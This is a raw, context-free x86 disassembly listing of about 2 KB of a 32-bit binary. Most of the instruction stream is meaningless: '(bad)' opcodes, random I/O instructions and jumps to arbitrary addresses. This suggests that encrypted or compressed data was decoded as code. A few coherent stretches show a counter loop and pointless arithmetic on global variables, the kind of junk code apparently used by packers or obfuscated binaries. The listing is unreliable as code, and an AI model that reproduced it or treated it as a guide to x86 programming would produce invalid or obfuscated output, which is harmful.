  4072b3:	scas   eax,DWORD PTR es:[edi]
  4072b4:	mov    esp,ecx
  4072b6:	xchg   ebp,eax
  4072b7:	inc    edi
  4072b8:	cmp    DWORD PTR [ebp-0x564e6e0c],ecx
  4072be:	jns    0x40728b
  4072c0:	ror    DWORD PTR [edi],cl
  4072c2:	xchg   ecx,eax
  4072c3:	mov    al,ds:0xa0af2c58
  4072c8:	adc    esp,DWORD PTR [ebx+0x5c7097e2]
  4072ce:	shr    esi,cl
  4072d0:	mov    bl,0x1a
  4072d2:	sub    BYTE PTR [ecx-0x53],dl
  4072d5:	cmp    bl,BYTE PTR [eax-0x7c]
  4072d8:	gs xchg edi,eax
  4072da:	mov    eax,ds:0xe8020045
  4072df:	pop    ecx
  4072e0:	and    eax,0xa8414f00
  4072e5:	out    0x4c,al
  4072e7:	ins    DWORD PTR es:[edi],dx
  4072e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072e9:	arpl   WORD PTR [edi-0x7e51c305],bp
  4072ef:	popf   
  4072f0:	leave  
  4072f1:	xor    ebp,DWORD PTR [esi-0x4d]
  4072f4:	loopne 0x4072df
  4072f6:	mov    DWORD PTR [ebx+0x177ba611],ebx
  4072fc:	in     eax,0x1a
  4072fe:	je     0x407332
  407300:	iret   
  407301:	sub    al,0xc0
  407303:	shr    ch,0x79
  407306:	mov    cs,eax
  407308:	dec    esi
  407309:	and    al,0x52
  40730b:	enter  0xd8ce,0x14
  40730f:	data16 jl 0x407375
  407312:	pusha  
  407313:	inc    edx
  407314:	xchg   ebp,eax
  407315:	ret    
  407316:	(bad)  
  407317:	mov    ds:0xb098dfca,eax
  40731c:	shl    DWORD PTR [eax+0xdc0a0fc],cl
  407322:	sbb    bl,BYTE PTR [eax-0x6e]
  407325:	pop    edi
  407326:	loope  0x40732f
  407328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407329:	sbb    al,0x1a
  40732b:	or     al,0x5d
  40732d:	and    al,BYTE PTR [eax-0x33]
  407330:	jmp    0xe59b176b
  407335:	scas   eax,DWORD PTR es:[edi]
  407336:	je     0x407398
  407338:	fwait
  407339:	into   
  40733a:	inc    esp
  40733b:	sahf   
  40733c:	mov    al,0x15
  40733e:	retf   
  40733f:	retf   0x4437
  407342:	or     BYTE PTR [edx],dh
  407344:	add    dl,BYTE PTR [edi+ebx*4-0x7e0bba75]
  40734b:	add    eax,0x42fd51
  407350:	and    edi,0x42
  407353:	add    BYTE PTR [ebx],dh
  407355:	mov    BYTE PTR [ecx+0x42fd7d05],0x0
  40735c:	not    BYTE PTR [edi+0x0]
  40735f:	add    BYTE PTR [ebx],al
  407361:	mov    DWORD PTR [ecx+0x42e78f35],0x2a1100
  40736b:	add    BYTE PTR [ecx+0x45c7e845],cl
  407371:	in     al,0x3c
  407373:	test   DWORD PTR [eax+edi*8+0x67ff45c6],ebx
  40737a:	and    DWORD PTR ds:0x42fd7d,0x0
  407384:	mov    eax,ds:0x42fd7d
  407389:	inc    eax
  40738a:	mov    ds:0x42fd7d,eax
  40738f:	cmp    DWORD PTR ds:0x42fd7d,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e4df
  4073a2:	cmp    DWORD PTR ds:0x42fd7d,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fd7d
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fd7d,eax
  4073ba:	cmp    DWORD PTR ds:0x42fd7d,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e1a8,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e787,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	lods   eax,DWORD PTR ds:[esi]
  4073fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073fd:	adc    ebp,ecx
  4073ff:	test   edi,0x7d207070
  407405:	jo     0x407477
  407407:	lea    eax,[esi-0x25ea8600]
  40740d:	mov    ch,0x20
  40740f:	addr16 enter 0xacb1,0x8e
  407414:	xor    ebx,DWORD PTR [eax+0xc85c74e]
  40741a:	sbb    BYTE PTR es:[ebx+0x5f],ah
  40741e:	iret   
  40741f:	push   0xffffffb4
  407421:	lock push 0xffffffdd
  407424:	stos   BYTE PTR es:[edi],al
  407425:	or     DWORD PTR [esi-0x78],edi
  407428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407429:	dec    edi
  40742a:	add    DWORD PTR [edi+0x41],eax
  40742d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40742e:	push   ebp
  40742f:	call   0x541a:0x2baea985
  407436:	sbb    eax,0x95a10dee
  40743b:	cmp    DWORD PTR [ebx+0x4],0xa0052d70
  407442:	mov    eax,0xb3ea4825
  407447:	in     al,0x53
  407449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40744a:	mov    ebp,0x8f32d003
  40744f:	cmp    ch,BYTE PTR [eax+0x7d500c59]
  407455:	mov    bl,0x1c
  407457:	mov    al,0x3a
  407459:	push   edi
  40745a:	mov    bl,0x7c
  40745c:	jnp    0x4073ff
  40745e:	lahf   
  40745f:	cs fdivr DWORD PTR cs:[ebp+eax*1-0x3c2fc025]
  407468:	xchg   BYTE PTR [ebx-0x3b74fd51],dh
  40746e:	out    0xfd,eax
  407470:	(bad)  
  407471:	shr    DWORD PTR [edx],cl
  407473:	ss (bad) 
  407475:	ror    DWORD PTR [edx-0x41],1
  407478:	in     al,0x74
  40747a:	and    bh,bh
  40747c:	retf   0xd489
  40747f:	std    
  407480:	push   ebp
  407481:	imul   esp,DWORD PTR [edx+0x5a645c6f],0x66920b29
  40748b:	rcr    BYTE PTR ds:0x26211a8b,0x81
  407492:	jmp    0x4074b4
  407494:	xchg   ebp,eax
  407495:	push   ds
  407496:	pushf  
  407497:	mov    dl,0xc3
  407499:	xor    esi,DWORD PTR [eax+0x32375a80]
  40749f:	arpl   WORD PTR [edx],ax
  4074a1:	mul    dl
  4074a3:	mov    al,ds:0x8435fa0b
  4074a8:	inc    edi
  4074a9:	adc    cl,BYTE PTR [esi+0x71a12483]
  4074af:	in     eax,0x18
  4074b1:	das    
  4074b2:	test   al,0x9f
  4074b4:	outs   dx,DWORD PTR ds:[esi]
  4074b5:	pop    esp
  4074b6:	inc    ebp
  4074b7:	iret   
  4074b8:	fucomp st(2)
  4074ba:	in     eax,dx
  4074bb:	mov    ah,0x38
  4074bd:	jmp    esi
  4074bf:	jl     0x4074d9
  4074c1:	jmp    0x4074d7
  4074c3:	rcr    BYTE PTR [ebp-0x2f],cl
  4074c6:	fild   WORD PTR [ebx+0x70]
  4074c9:	pop    eax
  4074ca:	jbe    0x4074ae
  4074cc:	inc    eax
  4074cd:	push   bx
  4074cf:	(bad)  
  4074d0:	mov    ebp,0x9483d570
  4074d5:	jl     0x4074a3
  4074d7:	(bad)  
  4074d8:	fmul   DWORD PTR [edi+0x60]
  4074db:	jb     0x40752c
  4074dd:	cmp    ebx,0x9f76cf08
  4074e3:	(bad)  
  4074e4:	imul   eax,eax,0xfffffff5
  4074e7:	jmp    0x7e75108
  4074ec:	and    BYTE PTR [ebx],0xfb
  4074ef:	ret    
  4074f0:	jmp    0x4074f8
  4074f2:	ror    DWORD PTR [ebx+ebp*8-0x76],1
  4074f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074f7:	mov    cl,0x2c
  4074f9:	add    BYTE PTR [ebx-0x3d],ah
  4074fc:	xor    al,0x90
  4074fe:	(bad)  
  4074ff:	push   ss
  407500:	pushf  
  407501:	outs   dx,DWORD PTR ds:[esi]
  407502:	pop    ss
  407503:	pusha  
  407504:	adc    eax,0xf126c5d6
  407509:	sub    BYTE PTR [edi],al
  40750b:	xchg   esi,eax
  40750c:	mov    ds:0x134e92e5,al
  407511:	jb     0x40754e
  407513:	call   0x5ce6c6b0
  407518:	inc    eax
  407519:	(bad)  
  40751a:	pop    esi
  40751b:	and    al,0x2
  40751d:	in     al,0xe5
  40751f:	xor    BYTE PTR [esi+0x2883cad3],ah
  407525:	ins    DWORD PTR es:[edi],dx
  407526:	in     al,0x87
  407528:	xchg   DWORD PTR [edx],edx
  40752a:	or     al,BYTE PTR [esi-0x55]
  40752d:	gs ins BYTE PTR es:[edi],dx
  40752f:	mov    ah,BYTE PTR [edi]
  407531:	in     al,dx
  407532:	bndstx [ecx-0x157a33e6],(bad)
  407539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40753a:	add    DWORD PTR [esi-0x75],eax
  40753d:	xchg   BYTE PTR [ebx+0x656db0ea],ah
  407543:	cwde   
  407544:	sub    eax,0x107a57fa
  407549:	dec    ebp
  40754a:	mov    esi,0xfbd96016
  40754f:	ins    DWORD PTR es:[edi],dx
  407550:	cmp    DWORD PTR [edi-0x32105822],esp
  407556:	lahf   
  407557:	mov    esi,0x4dbe50ba
  40755c:	xlat   BYTE PTR ds:[ebx]
  40755d:	bound  esp,QWORD PTR [ebx+0x79]
  407560:	add    esi,DWORD PTR cs:[eax+0x51]
  407564:	imul   edx,DWORD PTR [esi-0x3e],0x8
  407568:	out    dx,al
  407569:	outs   dx,BYTE PTR ds:[esi]
  40756a:	enter  0x2864,0x80
  40756e:	and    eax,0x19843684
  407573:	and    eax,0xbcc64e74
  407578:	lods   eax,DWORD PTR ds:[esi]
  407579:	shl    BYTE PTR [edx+0x161afc7f],1
  40757f:	mov    ch,0xd2
  407581:	fs xor al,0x1e
  407584:	mov    ecx,0x8b8a3e48
  407589:	push   ds
  40758a:	mov    ah,0x45
  40758c:	adc    eax,0x5a5cc8c5
  407591:	loop   0x407557
  407593:	xor    eax,0xae05f00e
  407598:	scas   al,BYTE PTR es:[edi]
  407599:	psubw  mm6,QWORD PTR [esi+0x7c41ccf3]
  4075a0:	add    BYTE PTR [edi],ah
  4075a2:	dec    ebp
  4075a3:	loopne 0x4075d4
  4075a5:	loope  0x4075ed
  4075a7:	sti    
  4075a8:	rcl    BYTE PTR [eax-0x32ae2564],0x6c
  4075af:	and    BYTE PTR [esp+edi*8],bl
  4075b2:	mov    edx,DWORD PTR [ecx-0x3d]
  4075b5:	lea    ebp,[ebp-0x19]
  4075b8:	inc    eax
  4075b9:	mov    ebp,0xb68fee3d
  4075be:	cmc    
  4075bf:	retf   
  4075c0:	sub    ebx,DWORD PTR ds:0x2de32b4b
  4075c6:	pop    edi
  4075c7:	push   ss
  4075c8:	lods   al,BYTE PTR ds:[esi]
  4075c9:	adc    esp,DWORD PTR [ebx]
  4075cb:	inc    eax
  4075cc:	pop    ss
  4075cd:	mov    DWORD PTR [ebx+0x10],ebx
  4075d0:	repz push ecx
  4075d2:	add    BYTE PTR [edi],dh
  4075d4:	mov    dl,0xc1
  4075d6:	(bad)  
  4075d8:	in     eax,dx
  4075d9:	add    DWORD PTR [ecx-0x79],eax
  4075dc:	out    dx,eax
  4075dd:	rol    edi,1
  4075df:	inc    edx
  4075e0:	add    DWORD PTR [ebx],esp
  4075e2:	aaa    
  4075e3:	(bad)  
  4075e4:	imul   edx,edx,0xc
  4075e7:	push   eax
  4075e8:	neg    DWORD PTR [ebp+0x5c]
  4075eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075ec:	mov    bh,0xba
  4075ee:	sbb    BYTE PTR [edi+0x35aa5c84],dh
  4075f4:	test   DWORD PTR [esi+eax*1+0x1a],0x2930dfc2
  4075fc:	test   BYTE PTR [esi],al
  4075fe:	ins    BYTE PTR es:[edi],dx
  4075ff:	iret   
  407600:	scas   al,BYTE PTR es:[edi]
  407601:	lahf   
  407602:	add    al,0x29
  407604:	mov    cl,BYTE PTR fs:[edi-0x7e]
  407608:	cmp    eax,0xd7eed31f
  40760d:	repz loope 0x40766d
  407610:	mov    ecx,esi
  407612:	inc    esp
  407613:	cdq    
  407614:	ins    DWORD PTR es:[edi],dx
  407615:	sbb    al,0x94
  407617:	int    0xc
  407619:	rcl    edi,0x4b
  40761c:	mov    BYTE PTR [ecx],bh
  40761e:	cmp    ch,cl
  407620:	lahf   
  407621:	ret    
  407622:	sub    eax,0x3c43fe7a
  407627:	mov    dh,0xcb
  407629:	in     al,0x8a
  40762b:	lock idiv BYTE PTR [edx-0x3d050f24]
  407632:	pop    esi
  407633:	or     BYTE PTR [ecx+eax*2],ah
  407636:	cs mov esi,0x780c1013
  40763c:	cmp    DWORD PTR [eax],eax
  40763e:	push   ds
  40763f:	int    0x93
  407641:	add    DWORD PTR [ecx-0x4025a9f3],0x3bb076d4
  40764b:	ss dec edi
  40764d:	sti    
  40764e:	imul   ebp,esp,0x19c1f469
  407654:	sahf   
  407655:	lea    ebp,[eax]
  407657:	xor    esi,DWORD PTR [ecx-0x3e994e21]
  40765d:	xchg   edi,eax
  40765e:	scas   al,BYTE PTR es:[edi]
  40765f:	mov    bh,0x36
  407661:	repnz xchg esp,edx
  407664:	hlt    
  407665:	xlat   BYTE PTR ds:[ebx]
  407666:	pop    edx
  407667:	xor    BYTE PTR [edi-0x3d],dh
  40766a:	adc    DWORD PTR [ecx-0xb],edi
  40766d:	cmc    
  40766e:	test   DWORD PTR [ecx+0x574a1617],ebx
  407674:	or     eax,0xf1822248
  407679:	sbb    al,0x5c
  40767b:	push   ebp
  40767c:	add    DWORD PTR fs:[eax+0x4a94314c],edi
  407683:	jg     0x4076fd
  407685:	pop    ds
  407686:	sbb    DWORD PTR ss:[eax-0x258ee53b],ecx
  40768d:	ds push cs
  40768f:	adc    DWORD PTR [esi+0x12dd01aa],esi
  407695:	jmp    0x407618
  407697:	enter  0xd710,0x64
  40769b:	xchg   DWORD PTR [edi-0x10c08f66],edi
  4076a1:	mov    ecx,esi
  4076a3:	inc    ebp
  4076a4:	add    cl,BYTE PTR [eax+eax*1]
  4076a7:	push   edi
  4076a8:	cmp    edi,edi
  4076aa:	jmp    0x407708
  4076ac:	rcr    DWORD PTR [eax],1
  4076ae:	jl     0x4076c0
  4076b0:	arpl   cx,cx
  4076b2:	dec    ebx
  4076b3:	(bad)  
  4076b4:	push   esi
  4076b5:	jmp    0x4076de
  4076b7:	in     al,dx
  4076b8:	test   DWORD PTR [esi],ecx
  4076ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076bc:	icebp  
  4076bd:	clc    
  4076be:	xor    dh,BYTE PTR [esi+0x7ebcc3b7]
  4076c4:	inc    ecx
  4076c5:	adc    ecx,DWORD PTR [eax-0x2f]
  4076c8:	or     DWORD PTR [ebp+ecx*2-0x17c81a7],esp
  4076cf:	lock push es
  4076d1:	push   ds
  4076d2:	sub    al,BYTE PTR ds:0xfbd11b97
  4076d8:	inc    ebp
  4076d9:	jb     0x4076e9
  4076db:	and    DWORD PTR ds:0x288d8c14,edi
  4076e1:	pop    edi
  4076e2:	pop    ecx
  4076e3:	jge    0x407740
  4076e5:	push   0x14108d57
  4076ea:	and    edx,edx
  4076ec:	dec    esi
  4076ed:	out    dx,eax
  4076ee:	push   ebx
  4076ef:	rcl    DWORD PTR cs:[ebp-0x442b185a],cl
  4076f6:	and    bl,0x3a
  4076f9:	or     BYTE PTR [ecx+0x67a8f575],0xf7
  407700:	repnz xchg ebx,eax
  407702:	mov    eax,ds:0x66f7cede
  407707:	pushf  
  407708:	sbb    bh,BYTE PTR [eax+0x389cf308]
  40770e:	mov    edi,ss
  407710:	jecxz  0x4076cb
  407712:	inc    esp
  407713:	dec    edx
  407714:	push   esp
  407715:	aas    
  407716:	jecxz  0x407721
  407718:	xor    DWORD PTR [esi],eax
  40771a:	mov    esi,0xfe40359
  40771f:	retf   
  407720:	shl    dh,cl
  407722:	cmp    ch,BYTE PTR ds:0xf227b03a
  407728:	ins    BYTE PTR es:[edi],dx
  407729:	clc    
  40772a:	int    0x7e
  40772c:	das    
  40772d:	test   eax,0x1f7a1ae8
  407732:	mov    ch,0xf7
  407734:	jb     0x407722
  407736:	loop   0x4076c3
  407738:	inc    ebp
  407739:	fdiv   QWORD PTR [ebx]
  40773b:	mov    BYTE PTR [ebx],0xc7
  40773e:	adc    DWORD PTR ds:0x42e19c,0x42fd89
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fd51,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e76f,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fd71,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e78f,0x42e76b
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e77f,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e783,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fd65,0x42fdee
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fe02,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	or     esp,ebx
  4077db:	dec    esi
  4077dc:	call   0x70b14488
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x40777d
  4077e6:	hlt    
  4077e7:	or     ebx,esp
  4077e9:	jmp    DWORD PTR [ebp-0xe]
  4077ec:	cmp    esi,edi
  4077ee:	mov    ebp,0x35ed0c10
  4077f3:	scas   eax,DWORD PTR es:[edi]
  4077f4:	mov    BYTE PTR [edx-0xb],cl
  4077f7:	xor    esp,0x2c3826dd
  4077fd:	outs   dx,BYTE PTR ds:[esi]
  4077fe:	cmp    ebx,DWORD PTR [ebx-0x3b]
  407801:	and    al,0xca
  407803:	pop    esi
  407804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407805:	pop    es
  407806:	dec    DWORD PTR ds:0x42f6f0ff
  40780c:	icebp  
  40780d:	adc    ecx,ecx
  40780f:	mov    ch,0x57
  407811:	nop
  407812:	pop    ecx
  407813:	xchg   edx,eax
  407814:	push   0xffffffb3
  407816:	xchg   BYTE PTR [ebp-0x44],ah
  407819:	lahf   
  40781a:	ins    BYTE PTR es:[edi],dx
  40781b:	add    eax,ebx
  40781d:	(bad)  [ebx+ecx*4+0x79ab842a]
  407824:	(bad)  
  407825:	fistp  DWORD PTR [ebx+0x5dd6cad2]
  40782b:	jno    0x4077b3
  40782d:	(bad)  
  40782f:	jnp    0x40786c
  407831:	mov    ds:0xf1e493c5,al
  407836:	or     ebx,edx
  407838:	inc    ebp
  407839:	adc    ch,BYTE PTR [esi]
  40783b:	inc    esi
  40783c:	mov    edi,0x53babe0a
  407841:	fs jl  0x4078a8
  407844:	or     eax,0x86a7f96b
  407849:	(bad)  
  40784a:	mov    ds,WORD PTR cs:[ebx-0x48]
  40784e:	retf   0xf71e
  407851:	sahf   
  407852:	fisub  DWORD PTR [ebp-0x4632dfad]
  407858:	cwde   
  407859:	inc    esp
  40785a:	in     eax,dx
  40785b:	inc    edx
  40785c:	test   DWORD PTR [edi+0x44],ebx
  40785f:	in     eax,0xe9
  407861:	pop    ecx
  407862:	sub    ecx,0x59
  407865:	das    
  407866:	push   edx
  407868:	push   esp
  407869:	rcl    DWORD PTR [edx+0x3b],cl
  40786c:	pop    esp
  40786d:	fneni(8087 only) 
  40786f:	xchg   ebp,eax
  407870:	clc    
  407871:	pop    esi
  407872:	mov    edx,0xd7304ae1
  407877:	cmp    BYTE PTR [esi],cl
  407879:	cmp    eax,0x65cfaa02
  40787e:	leave  
  40787f:	fwait
  407880:	sub    BYTE PTR [edi],0x5f
  407883:	or     cl,bl
  407885:	fidivr DWORD PTR [ebx+0x50fb7d7a]
  40788b:	(bad)  
  40788d:	push   edx
  40788e:	cmp    al,0xad
  407890:	xchg   ebx,eax
  407891:	sbb    BYTE PTR [edx+0x19e2f06],0x7b
  407898:	sti    
  407899:	xlat   BYTE PTR ds:[ebx]
  40789a:	in     eax,0xb0
  40789c:	ins    DWORD PTR es:[edi],dx
  40789d:	jae    0x4078c4
  40789f:	pop    eax
  4078a0:	adc    ah,BYTE PTR ds:0x310b2627
  4078a6:	cmp    esi,edx
  4078a8:	jl     0x4078b7
  4078aa:	aaa    
  4078ab:	aad    0x34
  4078ad:	add    BYTE PTR [ebx-0x33],dh
  4078b0:	dec    DWORD PTR [ebx-0x3ced41c5]
  4078b6:	dec    edx
  4078b7:	sub    dl,BYTE PTR [edi]
  4078b9:	dec    esp
  4078ba:	push   cs
  4078bb:	mov    ebp,0xc4ad18e9
  4078c0:	push   0xffffff99
  4078c2:	cwde   
  4078c3:	add    al,0x7b
  4078c5:	mov    esp,0xfbc86322
  4078ca:	xchg   ebx,eax
  4078cb:	push   es
  4078cc:	adc    BYTE PTR [edi-0x3d92da8a],cl
  4078d2:	push   ecx
  4078d3:	out    0x6f,al
  4078d5:	imul   ebp,DWORD PTR [edi+0x47],0x7e
  4078d9:	mov    ecx,0xd331ad06
  4078de:	add    eax,0x2a91f51a
  4078e3:	sub    cl,BYTE PTR [esp+eiz*4-0x35]
  4078e7:	out    0x54,al
  4078e9:	cmp    DWORD PTR ds:0x4e005984,ecx
  4078ef:	or     al,0x8e
  4078f1:	ss cmp al,0x94
  4078f4:	test   DWORD PTR [ebx-0x2d],esi
  4078f7:	nop
  4078f8:	les    eax,FWORD PTR [edx+0x209d8e12]
  4078fe:	cli    
  4078ff:	cmp    eax,0x7bcaaec9
  407904:	xchg   esi,eax
  407905:	jnp    0x407898
  407907:	shr    al,cl
  407909:	jne    0x4078af
  40790b:	imul   ebx,DWORD PTR [ebp-0x56fe8772],0x6b3011cf
  407915:	add    eax,0xee2b5ee2
  40791a:	xchg   esp,eax
  40791b:	das    
  40791c:	hlt    
  40791d:	inc    esp
  40791e:	dec    edi
  40791f:	dec    edi
  407920:	or     dl,BYTE PTR [edx-0x1c]
  407923:	ins    DWORD PTR es:[edi],dx
  407924:	int    0x31
  407926:	push   ecx
  407927:	dec    ecx
  407928:	pop    edi
  407929:	push   esi
  40792a:	sub    al,BYTE PTR [eiz*2+0x6c406f15]
  407931:	test   DWORD PTR [eax],eax
  407933:	shr    BYTE PTR [edi],cl
  407935:	retf   0x22a0
  407938:	inc    eax
  407939:	jne    0x4079b3
  40793b:	mov    esi,0xecf9c2f
  407940:	xchg   esi,eax
  407941:	cdq    
  407942:	arpl   si,ax
  407944:	scas   eax,DWORD PTR es:[edi]
  407945:	mov    dl,0xb0
  407947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407948:	out    0x57,al
  40794a:	loop   0x40797d
  40794c:	retf   
  40794d:	adc    BYTE PTR [ebx],bh
  40794f:	clc    
  407950:	fscale 
  407952:	repz mov edx,0x22a23206
  407958:	aaa    
  407959:	loop   0x40799e
  40795b:	(bad)  
  40795c:	xchg   ecx,eax
  40795d:	repz shl DWORD PTR [ebx],1
  407960:	int    0xf6
  407962:	sub    ah,BYTE PTR [edx]
  407964:	outs   dx,DWORD PTR ds:[esi]
  407965:	inc    edi
  407966:	fimul  DWORD PTR [edi]
  407968:	or     al,0x6e
  40796a:	cmp    BYTE PTR [edx+edx*2-0x32],dh
  40796e:	add    DWORD PTR [eax-0x1a98bc7f],edi
  407974:	jmp    0x40790b
  407976:	fst    DWORD PTR [esi]
  407978:	dec    ebp
  407979:	jne    0x40791c
  40797b:	mov    ds:0xab68c765,eax
  407980:	add    DWORD PTR [edx-0xf0c226c],0xffffff8e
  407987:	shr    DWORD PTR [esi],cl
  407989:	jb     0x40795e
  40798b:	nop
  40798c:	les    ebx,FWORD PTR [eax]
  40798e:	mov    ebx,0x97ddc4d9
  407993:	adc    al,0xa3
  407995:	xchg   edx,eax
  407996:	or     BYTE PTR [esi-0x2bd3ba6c],dh
  40799c:	dec    ebx
  40799d:	sbb    DWORD PTR [eax-0x2e],edx
  4079a0:	scas   eax,DWORD PTR es:[edi]
  4079a1:	xchg   DWORD PTR [ebx+0x1771d3c0],esi
  4079a7:	pusha  
  4079a8:	js     0x407a1a
  4079aa:	adc    esi,ebx
  4079ac:	mov    dh,dl
  4079ae:	pop    edi
  4079af:	sbb    BYTE PTR [ecx+ebx*2+0x36],0x4c
  4079b4:	lahf   
  4079b5:	(bad)  
  4079b6:	mov    dl,0x5c
  4079b8:	jmp    0x407a21
  4079ba:	add    edi,DWORD PTR [esi]
  4079bc:	mov    eax,ds:0xf07872e4
  4079c1:	mov    al,ds:0xf0f9b3fa
  4079c6:	mul    DWORD PTR [ebp+0x1d]
  4079c9:	cmp    eax,0x7e811996
  4079ce:	add    eax,0x33be3433
  4079d3:	out    dx,al
  4079d4:	xchg   esi,eax
  4079d5:	pop    edx
  4079d6:	inc    eax
  4079d7:	(bad)  [esi+ebx*8-0x7efcc50]
  4079de:	xor    eax,0x263d0a9c
  4079e3:	int3   
  4079e4:	call   0xc8b001ae
  4079e9:	jns    0x407985
  4079eb:	shl    edi,1
  4079ed:	repz js 0x40797f
  4079f0:	xchg   esp,eax
  4079f1:	xor    al,0xf8
  4079f3:	dec    edx
  4079f4:	cli    
  4079f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079f6:	test   DWORD PTR [esi],esi
  4079f8:	mov    dl,0xdf
  4079fa:	shr    esi,1
  4079fc:	cmp    eax,0x67669119
  407a01:	fdivr  DWORD PTR [ecx-0x64854468]
  407a07:	fwait
  407a08:	pop    esp
  407a09:	ds adc al,0x7b
  407a0c:	cmp    eax,0xc74aa9b
  407a11:	adc    esi,DWORD PTR [ebp+0x51]
  407a14:	xchg   esp,eax
  407a15:	(bad)
  407a18:	jb     0x407a7a
  407a1a:	jg     0x407a61
  407a1c:	dec    esp
  407a1d:	je     0x407a93
  407a1f:	scas   eax,DWORD PTR es:[edi]
  407a20:	enter  0xc43c,0xe6
  407a24:	mov    esp,0x1001217b
  407a29:	imul   ecx,DWORD PTR [edi+0x59],0x1a4692fa
  407a30:	into   
  407a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a32:	stos   BYTE PTR es:[edi],al
  407a33:	pushf  
  407a34:	add    bl,ch
  407a36:	int3   
  407a37:	pop    esi
  407a38:	add    al,0xfe
  407a3a:	jbe    0x407a3c
  407a3c:	loope  0x4079e6
  407a3e:	or     al,0xb7
  407a40:	fild   WORD PTR [esi+0x7a679f14]
  407a46:	jg     0x4079ed
  407a48:	push   es
  407a49:	sub    al,0x96
  407a4b:	in     eax,0x83
  407a4d:	xchg   ebp,eax
  407a4e:	push   es
  407a4f:	xchg   edi,eax
  407a50:	add    al,0x27
  407a52:	dec    BYTE PTR [ebx-0x6e62fb62]
  407a58:	sub    al,0x2f
  407a5a:	imul   DWORD PTR [edi]
  407a5c:	push   es
  407a5d:	inc    BYTE PTR [edi+0xe5bf81e]
  407a63:	shr    DWORD PTR [edi],cl
  407a65:	inc    edi
  407a66:	sbb    BYTE PTR [esi+eax*1-0x1f],ah
  407a6a:	xchg   ebp,eax
  407a6b:	push   esp
  407a6c:	outs   dx,BYTE PTR ds:[esi]
  407a6d:	cmp    DWORD PTR [esi*8+0x40045170],ecx
  407a74:	xchg   DWORD PTR [ebx+0x11],ecx
  407a77:	cli    
  407a78:	or     eax,ebp
  407a7a:	nop
  407a7b:	stos   DWORD PTR es:[edi],eax
  407a7c:	cmc    
  407a7d:	enter  0x10b5,0xca
  407a81:	jg     0x407a49
  407a83:	sbb    eax,DWORD PTR [bx+di-0x2]
  407a87:	adc    BYTE PTR [edx+edi*1+0x46],bl
  407a8b:	inc    ecx
  407a8c:	inc    edx
  407a8d:	dec    edx
  407a8e:	(bad)  
  407a8f:	jno    0x407af8
  407a91:	mov    ecx,0x907a9273
  407a96:	(bad)  
  407a97:	repz pop ds
  407a99:	(bad)  
  407a9a:	push   0x34da9378
  407a9f:	cli    
  407aa0:	mov    al,ds:0xc7a0d5ac
  407aa5:	dec    edx
  407aa6:	outs   dx,DWORD PTR ds:[esi]
  407aa7:	stos   BYTE PTR es:[edi],al
  407aa8:	inc    eax
  407aa9:	les    ecx,FWORD PTR [ecx-0x2c]
  407aac:	in     eax,dx
  407aad:	test   al,0xd
  407aaf:	stc    
  407ab0:	sub    BYTE PTR [esi+0xd],ah
  407ab3:	dec    eax
  407ab4:	adc    al,0xd6
  407ab6:	sti    
  407ab7:	mov    ebp,0xd4e308ca
  407abc:	mov    ebp,0xe13012ad
  407ac1:	xchg   ecx,eax
  407ac2:	pop    ss
  407ac3:	xor    edx,DWORD PTR [eax-0x27]
  407ac6:	jo     0x407aaf
  407ac8:	ret    0x452f
  407acb:	xchg   edi,ebp
